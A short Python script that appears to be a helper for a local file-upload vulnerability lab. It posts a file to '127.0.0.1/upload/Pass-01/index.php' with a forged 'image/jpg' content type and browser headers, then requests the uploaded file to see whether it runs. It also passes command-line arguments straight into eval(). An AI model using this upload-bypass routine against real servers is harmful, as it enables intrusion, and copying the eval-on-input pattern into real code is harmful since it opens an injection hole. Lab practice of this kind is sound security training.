# # multipart/from-data


import os, sys, requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

uploadurl = 'http://127.0.0.1/upload/Pass-01/index.php'
payloadurl_basic = 'http://127.0.0.1/upload/upload/'
argvstr = sys.argv[1:]
argv_dict = {'type':'img','file':"desk.jpg"}
payloadurl = payloadurl_basic + argv_dict['file']
for argv in argvstr:
    argv = str(argv).replace("\r\n", "")
    DICT = eval(argv)
    argv_dict.update(DICT)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Referer': uploadurl
}

multipart_encoder = MultipartEncoder(
    fields={

        # 'friendfield': argv_dict['friendfield'],
        # 'content': argv_dict['content'],
        'upload_file': (os.path.basename(argv_dict['file']), open(argv_dict['file'], 'rb'), 'image/jpg'),
        # file为路径
        'submit':''
    },
    boundary='-----------------------------' + 'WebKitFormBoundaryOUhbJ8skfU9dxjka'
)

headers['Content-Type'] = multipart_encoder.content_type
# 请求头必须包含一个特殊的头信息，类似于Content-Type: multipart/form-data; boundary=${bound}
# print(headers)
# print(multipart_encoder)
r = requests.post(uploadurl, data=multipart_encoder, headers=headers)
res = requests.get(url=payloadurl)
print(res.text)